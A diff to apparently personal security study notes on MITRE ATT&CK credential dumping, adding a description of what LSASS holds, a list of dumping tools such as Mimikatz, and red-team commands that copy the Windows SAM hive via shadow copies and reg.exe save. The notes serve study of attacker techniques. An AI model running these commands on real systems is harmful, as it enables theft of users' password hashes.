@@ -370,6 +370,14 @@ Notes from "MITRE ATT&CK - OS Credential Dumping" by Picus Security.
 
 ```
 This service is responsible for storing the credentials of users logged into memory.
+Stores reversibly encrypted plain text, Kerberos tickets, and LM and NT hashes.
+Local Administrador or System is required to interact with "lsass.exe" process.
+```
+```
+Tools used to dump credentials from Lsass:
+1. Mimikatz
+2. Gsecdump
+3. ProcDump
 ```
 <br>
 
@@ -408,7 +416,22 @@ LSA secrets can be dumped using Mimikatz: lsadump::secrets
 <br>
 
 ### Red Team Examples
+<br>
+#### Copy SAM file from shadows
 
+1. Create shadow copy: 
+`wmic shadowcopy call create Volume=C:\`
+<br>
+2. Enumerate shadows and the path of shadows:
+`vssadmin List Shadows`
+<br>
+3. Copy SAM file from shadow: 
+`copy $PathToShadow\Windows\System32\config\SAM C:\temp`
+<br>
+
+##### From Registry
+1. Extracting SAM registry using `reg.exe`
+   `reg.exe save hklm\sam c:\temp\sam.save`
 
 
 <br>
